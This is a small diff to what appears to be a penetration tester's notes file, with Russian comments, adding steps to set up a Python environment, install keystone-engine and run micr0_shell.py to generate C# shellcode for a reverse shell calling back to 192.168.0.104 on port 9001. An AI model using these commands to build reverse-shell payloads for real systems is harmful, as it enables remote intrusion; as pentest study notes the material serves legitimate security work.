@@ -25,3 +25,15 @@ create lnk
 # PowerShell ConstrainedLanguage Mode
 
     $ExecutionContext.SessionState.LanguageMode
+
+# Создаём виртуальное окружение
+    python3 -m venv venv
+
+# Активируем его
+    source venv/bin/activate
+
+    # Устанавливаем правильный keystone-engine (НЕ keystone!)
+    pip install keystone-engine
+
+    python micr0_shell.py -i 192.168.0.104 -p 9001 -l csharp
+    tr -d '\r\n' < temp479  > output.txt
